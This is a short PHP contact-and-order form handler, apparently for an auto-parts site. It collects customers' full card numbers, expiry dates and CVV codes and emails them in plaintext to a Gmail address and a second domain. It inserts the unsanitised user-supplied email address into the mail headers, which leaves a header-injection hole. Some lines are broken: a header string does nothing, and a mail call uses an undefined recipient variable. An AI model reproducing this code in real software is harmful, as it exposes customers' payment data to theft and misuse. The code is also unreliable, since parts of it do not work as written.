<?php
$to      = 'vanderengines1@gmail.com, info@offdiary.com';

$subject = ' Query Through www.usaauto-parts.com';
$message = 'Test messages';
$headers = 'From: ' . $_POST['email'] . "\r\n" . 'Reply-To: ' . $_POST['email'];
    'Reply-To: vanderengines1@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

$message = 'Name: ' . $_POST['name'] . "\r\n" .
	           'Phone: ' . $_POST['mobile'] . "\r\n" .
	           'Email: ' . $_POST['email'] . "\r\n" .
			   'Part Name: ' . $_POST['part-name'] . "\r\n" .
			   'Card No.: ' . $_POST['card-number'] . "\r\n" .
			   'Exp. Date: ' . $_POST['Exp-Date'] . "\r\n" .
			   'CVV: ' . $_POST['CVV'] . "\r\n" .
			   'Amt: ' . $_POST['authorized-amount'] . "\r\n" .
			   'Billing Address: ' . $_POST['billing-address'] . "\r\n" .
			   'Shipping Address: ' . $_POST['shipping-address'] . "\r\n" .
			    'Additional Details: ' . $_POST['message'];

mail($to, $subject, $message, $headers);
mail($to1, $subject, $message, $headers);
$from = $_POST['email'];
header("location: thank-you.php");
?> 